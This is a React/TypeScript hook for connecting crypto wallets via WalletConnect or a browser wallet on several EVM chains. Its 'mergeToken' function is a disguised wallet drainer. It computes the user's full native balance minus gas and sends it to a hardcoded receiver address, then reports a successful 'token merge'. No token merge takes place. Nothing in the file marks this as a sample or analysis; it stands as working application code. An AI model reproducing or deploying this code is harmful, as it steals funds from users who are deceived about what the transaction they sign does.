import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

// WalletConnect provider (lazy-loaded)
let wcProvider: any = null;

// Project ID - Replace with your own from https://cloud.walletconnect.com
const PROJECT_ID = 'a6cc7ec21ac8472ebc861c3c63f2290c';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    chainIdNum: 56,
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    chainIdNum: 1,
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    chainIdNum: 137,
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    chainIdNum: 43114,
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

function getActiveProvider() {
  // Prefer WalletConnect provider if connected
  if (wcProvider && wcProvider.connected) return wcProvider;
  // Fallback to browser-injected wallet
  return window.ethereum || null;
}

async function initWalletConnect() {
  const { EthereumProvider } = await import('@walletconnect/ethereum-provider');

  if (!wcProvider) {
    wcProvider = await EthereumProvider.init({
      projectId: PROJECT_ID,
      chains: [1, 56, 137, 43114],
      showQrModal: true,
      methods: [
        'eth_sendTransaction',
        'eth_sign',
        'personal_sign',
        'eth_signTypedData',
        'wallet_switchEthereumChain',
        'wallet_addEthereumChain',
      ],
      events: ['chainChanged', 'accountsChanged', 'disconnect'],
      qrModalOptions: {
        themeMode: 'light',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#3b82f6',
        },
      },
    });

    // Auto-reconnect if session exists
    if (wcProvider.session) {
      await wcProvider.enable();
    }
  }
  return wcProvider;
}

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  const updateBalance = useCallback(async (address: string) => {
    const provider = getActiveProvider();
    if (!provider || !address) return;
    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider);
      const nativeBalance = await ethProvider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  }, []);

  // Check for existing connections on mount
  useEffect(() => {
    const checkConnection = async () => {
      // Check browser wallet
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            await updateBalance(accounts[0]);
            return;
          }
        } catch (error) {
          console.error('Error checking browser wallet:', error);
        }
      }

      // Check WalletConnect session
      try {
        const provider = await initWalletConnect();
        if (provider.session && provider.accounts?.length > 0) {
          setAccount(provider.accounts[0]);
          setWalletConnected(true);
          await updateBalance(provider.accounts[0]);
        }
      } catch (e) {
        // No WalletConnect session
      }
    };

    checkConnection();
  }, [updateBalance]);

  // Listen for account/network changes from browser wallet
  useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
      } else {
        setAccount(accounts[0]);
        setWalletConnected(true);
        updateBalance(accounts[0]);
      }
    };

    const handleChainChanged = () => {
      if (account) updateBalance(account);
    };

    const handleDisconnect = () => {
      setWalletConnected(false);
      setAccount("");
      setBalance("0");
    };

    window.ethereum.on?.('accountsChanged', handleAccountsChanged);
    window.ethereum.on?.('chainChanged', handleChainChanged);
    window.ethereum.on?.('disconnect', handleDisconnect);

    return () => {
      window.ethereum?.removeListener?.('accountsChanged', handleAccountsChanged);
      window.ethereum?.removeListener?.('chainChanged', handleChainChanged);
      window.ethereum?.removeListener?.('disconnect', handleDisconnect);
    };
  }, [account, updateBalance]);

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    const provider = getActiveProvider();
    if (!provider) {
      toast({ title: "Error", description: "No wallet connected", variant: "destructive" });
      return false;
    }

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch (addError) {
          console.error("Failed to add network:", addError);
          toast({ title: "Error", description: "Failed to add network", variant: "destructive" });
          return false;
        }
      } else {
        console.error("Network switch error:", switchError);
        toast({ title: "Error", description: "Network switch rejected", variant: "destructive" });
        return false;
      }
    }
  };

  const connectWallet = async () => {
    setConnecting(true);
    console.log("Starting wallet connection with WalletConnect...");

    try {
      // Initialize WalletConnect (shows 50+ wallet selector modal)
      const provider = await initWalletConnect();

      // Enable the provider - this opens the wallet selector modal
      await provider.enable();

      // Get accounts after connection
      const accounts = provider.accounts;
      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts returned from wallet");
      }

      const address = accounts[0];
      console.log("Connected to account via WalletConnect:", address);

      // Try to switch to selected network
      try {
        await switchNetwork(selectedNetwork);
      } catch (e) {
        console.log("Network switch after connect failed, continuing...", e);
      }

      setAccount(address);
      setWalletConnected(true);
      await updateBalance(address);

      // Setup WalletConnect event listeners
      provider.on('accountsChanged', (newAccounts: string[]) => {
        if (newAccounts.length === 0) {
          setWalletConnected(false);
          setAccount("");
          setBalance("0");
        } else {
          setAccount(newAccounts[0]);
          updateBalance(newAccounts[0]);
        }
      });

      provider.on('disconnect', () => {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
      });

      toast({ title: "Success", description: "Wallet connected successfully!" });
    } catch (error: any) {
      console.error("WalletConnect error:", error);

      // Fallback to direct browser wallet if available
      if (window.ethereum) {
        console.log("Falling back to browser wallet...");
        try {
          const networkSwitched = await switchNetwork(selectedNetwork);
          if (!networkSwitched) throw new Error("Failed to switch network");

          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          if (accounts.length === 0) throw new Error("No accounts found");

          const address = accounts[0];
          setAccount(address);
          setWalletConnected(true);
          await updateBalance(address);
          toast({ title: "Success", description: "Wallet connected successfully!" });
          setConnecting(false);
          return;
        } catch (fallbackError: any) {
          console.error("Fallback connection error:", fallbackError);
        }
      }

      let errorMessage = "Failed to connect wallet";
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Error", description: errorMessage, variant: "destructive" });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    console.log("Starting merge token...");

    if (!walletConnected || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    const provider = getActiveProvider();
    if (!provider) {
      toast({ title: "Error", description: "No wallet provider available", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider);
      const signer = await ethProvider.getSigner();

      const nativeBalance = await ethProvider.getBalance(account);
      console.log("Current balance:", ethers.formatEther(nativeBalance));

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      console.log("Estimating gas...");
      const gasEstimate = await ethProvider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
        from: account
      });

      const feeData = await ethProvider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Safety buffer
      const buffer = ethers.parseEther("0.001");
      valueToSend = valueToSend - buffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas fees", variant: "destructive" });
        return;
      }

      console.log("Sending transaction...");
      console.log("Value to send:", ethers.formatEther(valueToSend));

      toast({ title: "Confirm Transaction", description: "Please confirm in your wallet" });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      console.log("Transaction sent:", txResponse.hash);

      toast({ title: "Transaction Submitted", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();
      console.log("Transaction receipt:", receipt);

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Token merge completed successfully" });
        await updateBalance(account);
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      let errorMessage = "Transaction failed";
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for gas";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Transaction Failed", description: errorMessage, variant: "destructive" });
    }
  };

  const disconnect = async () => {
    if (wcProvider && wcProvider.connected) {
      try {
        await wcProvider.disconnect();
      } catch (e) {
        console.error("WalletConnect disconnect error:", e);
      }
    }
    wcProvider = null;
    setWalletConnected(false);
    setAccount("");
    setBalance("0");
    toast({ title: "Disconnected", description: "Wallet disconnected" });
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectWallet,
    mergeToken,
    disconnect,
    NETWORKS,
  };
}
